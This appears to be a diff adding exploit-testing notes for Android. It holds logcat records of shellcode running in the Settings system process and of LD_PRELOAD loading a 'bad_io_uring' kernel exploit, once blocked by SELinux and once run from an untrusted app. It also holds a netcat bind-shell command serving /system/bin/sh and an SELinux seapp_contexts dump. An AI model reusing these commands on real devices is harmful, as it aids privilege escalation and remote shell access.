@@ -1,0 +1,57 @@
+unsucessfule injection:
+09-23 04:48:33.440  3214  3227 I MainActivity: Shellcode has been executed in uid=1000 pid=3247 packageName=com.android.settings
+09-23 04:48:33.440  3214  3227 I MainActivity: uid=1000(system) gid=1000(system) groups=1000(system),1007(log),1065(reserved_disk),1077(external_storage),3001(net_bt_admin),3002(net_bt),3003(inet),3007(net_bw_acct),9997(everybody) context=u:r:system_app:s0
+09-23 04:48:33.441  3247  3264 I MainActivity: running exploit: bad_io_uring.so
+09-23 04:48:33.442  3247  3264 I MainActivity: running command: LD_LIBRARY_PATH=/data/user_de/0/com.android.settings LD_PRELOAD=/data/user_de/0/com.android.settings/bad_io_uring.so sleep 10
+09-23 04:48:33.464  3214  3227 I OpenGLRenderer: Davey! duration=1012ms; Flags=0, FrameTimelineVsyncId=8533, IntendedVsync=107219123840, Vsync=108119123804, InputEventId=0, HandleInputStart=108122341954, AnimationStart=108122346502, PerformTraversalsStart=108123001870, DrawStart=108124103830, FrameDeadline=107252457172, FrameInterval=108122197834, FrameStartTime=16666666, SyncQueued=108125221882, SyncStart=108125291230, IssueDrawCommandsStart=108125380390, SwapBuffers=108126217510, FrameCompleted=108231415367, DequeueBufferDuration=16464, QueueBufferDuration=247644, GpuCompleted=108126217510, SwapBuffersCompleted=108231415367, DisplayPresentTime=0, CommandSubmissionCompleted=108126217510, 
+09-23 04:48:33.503  3267  3267 W sleep   : type=1400 audit(0.0:146): avc: denied { execute } for path="/data/user_de/0/com.android.settings/bad_io_uring.so" dev="dm-50" ino=2666 scontext=u:r:system_app:s0 tcontext=u:object_r:system_app_data_file:s0 tclass=file permissive=0
+--------- beginning of crash
+09-23 04:48:33.511  3267  3267 F linker  : CANNOT LINK EXECUTABLE "sleep": couldn't map "/data/user_de/0/com.android.settings/bad_io_uring.so" segment 2: Permission denied
+
+successful test:
+secontext: u:r:untrusted_app:s0:c95,c256+ u0_a95
+
+09-23 04:49:44.846  3316  3341 I MainActivity: running exploit: bad_io_uring_5.10.101_log.so
+09-23 04:49:44.849  3316  3341 I MainActivity: running command: LD_LIBRARY_PATH=/data/user/0/com.example.testapp LD_PRELOAD=/data/user/0/com.example.testapp/bad_io_uring_5.10.101_log.so sleep 10
+09-23 04:49:44.885   637  2512 D CoreBackPreview: Window{81a29da u0 com.example.testapp/com.example.testapp.MainActivity}: Setting back callback OnBackInvokedCallbackInfo{mCallback=android.window.IOnBackInvokedCallback$Stub$Proxy@3b864e8, mPriority=0}
+09-23 04:49:44.913  3316  3341 I MainActivity: running command: nc -s 127.0.0.1 -p 1234 -L /system/bin/sh -l
+
+
+/system/etc/selinux/plat_seapp_contexts contents:
+isSystemServer=true domain=system_server_startup
+user=_app seinfo=platform name=com.android.traceur domain=traceur_app type=app_data_file levelFrom=all
+user=_app isPrivApp=true name=com.android.remoteprovisioner domain=remote_prov_app type=app_data_file levelFrom=all
+user=system seinfo=platform domain=system_app type=system_app_data_file
+user=bluetooth seinfo=bluetooth domain=bluetooth type=bluetooth_data_file
+user=network_stack seinfo=network_stack domain=network_stack type=radio_data_file
+user=nfc seinfo=platform domain=nfc type=nfc_data_file
+user=secure_element seinfo=platform domain=secure_element levelFrom=all
+user=radio seinfo=platform domain=radio type=radio_data_file
+user=shared_relro domain=shared_relro levelFrom=all
+user=shell seinfo=platform domain=shell name=com.android.shell type=shell_data_file
+user=webview_zygote seinfo=webview_zygote domain=webview_zygote
+user=_isolated domain=isolated_app levelFrom=user
+user=_sdksandbox domain=sdk_sandbox type=sdk_sandbox_data_file levelFrom=all
+user=_app seinfo=app_zygote domain=app_zygote levelFrom=user
+user=_app seinfo=media domain=mediaprovider type=app_data_file levelFrom=user
+user=_app seinfo=platform domain=platform_app type=app_data_file levelFrom=user
+user=_app isEphemeralApp=true domain=ephemeral_app type=app_data_file levelFrom=all
+user=_app isPrivApp=true domain=priv_app type=privapp_data_file levelFrom=user
+user=_app isPrivApp=true name=com.google.android.permissioncontroller domain=permissioncontroller_app type=privapp_data_file levelFrom=all
+user=_app seinfo=media isPrivApp=true name=com.android.providers.media.module domain=mediaprovider_app type=privapp_data_file levelFrom=all
+user=_app isPrivApp=true name=com.google.android.providers.media.module domain=mediaprovider_app type=privapp_data_file levelFrom=all
+user=_app seinfo=platform isPrivApp=true name=com.android.permissioncontroller domain=permissioncontroller_app type=privapp_data_file levelFrom=all
+user=_app isPrivApp=true name=com.android.vzwomatrigger domain=vzwomatrigger_app type=privapp_data_file levelFrom=all
+user=_app isPrivApp=true name=com.google.android.gms domain=gmscore_app type=privapp_data_file levelFrom=user
+user=_app isPrivApp=true name=com.google.android.gms.* domain=gmscore_app type=privapp_data_file levelFrom=user
+user=_app isPrivApp=true name=com.google.android.gms:* domain=gmscore_app type=privapp_data_file levelFrom=user
+user=_app isPrivApp=true name=com.google.android.gsf domain=gmscore_app type=privapp_data_file levelFrom=user
+user=_app minTargetSdkVersion=32 domain=untrusted_app type=app_data_file levelFrom=all
+user=_app minTargetSdkVersion=30 domain=untrusted_app_30 type=app_data_file levelFrom=all
+user=_app minTargetSdkVersion=29 domain=untrusted_app_29 type=app_data_file levelFrom=all
+user=_app minTargetSdkVersion=28 domain=untrusted_app_27 type=app_data_file levelFrom=all
+user=_app minTargetSdkVersion=26 domain=untrusted_app_27 type=app_data_file levelFrom=user
+user=_app domain=untrusted_app_25 type=app_data_file levelFrom=user
+user=_app minTargetSdkVersion=28 fromRunAs=true domain=runas_app levelFrom=all
+user=_app fromRunAs=true domain=runas_app levelFrom=user
+
